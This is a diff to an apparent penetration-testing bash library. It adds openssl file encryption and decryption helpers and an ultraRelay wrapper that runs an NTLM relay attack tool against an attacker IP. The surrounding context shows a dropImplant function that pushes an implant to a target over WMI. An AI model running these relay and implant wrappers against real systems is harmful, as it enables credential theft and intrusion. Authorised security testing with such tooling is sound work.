@@ -14,6 +14,7 @@
 # https://github.com/Gallopsled/pwntools.git
 # https://github.com/fox-it/BloodHound.py.git
 # https://github.com/wshepherd0010/network.git
+# https://github.com/5alt/ultrarelay.git
 # apt-get install googlesearch
 
 # SECTION: Global environment variables:
@@ -59,6 +60,35 @@ function stopLoggingSession(){
     return;
 }
 
+function encryptFile(){
+    # DESCRIPTION: Encrypt file using AES-256-CBC and password.
+    # ARGUMENT: FILEIN, FILEOUT, PASS.
+    FILEIN=$1;
+    FILEOUT=$2;
+    PASS=$3;
+    openssl enc \
+    -aes-256-cbc \
+    -salt -pbkdf2 \
+    -in "${FILEIN}" \
+    -out "${FILEOUT}" \
+    -k "${PASS}";
+    return;
+}
+
+function decryptFile(){
+    # DESCRIPTION: Decrypt AES-256-CBC encrypted file using password.
+    # ARGUMENT: FILEIN, FILEOUT, PASS.
+    FILEIN=$1;
+    FILEOUT=$2;
+    PASS=$3;
+    openssl enc \
+    -aes-256-cbc \
+    -pbkdf2 -d \
+    -in "${FILEIN}" \
+    -out "${FILEOUT}" \
+    -k "${PASS}";
+    return;
+}
 
 function googleSearch(){
     # DESCRIPTION: Quick Google search against domains for strings/terms.
@@ -1048,6 +1078,15 @@ function dropImplant(){
     # ARGUMENT: TARGET.
     TARGET=$1;
     wmiCommand $TARGET $IMPLANT;
+    return;
+}
+
+function ultraRelay(){
+    # DESCRIPTION: NTML (NTLM back to host) relay via Java applet.
+    # ARGUMENT: ATTACKERIP.
+    ATTACKERIP=$1;
+    python /opt/ultrarelay/ultrarelay.py \
+    -ip ${ATTACKERIP};
     return;
 }
 
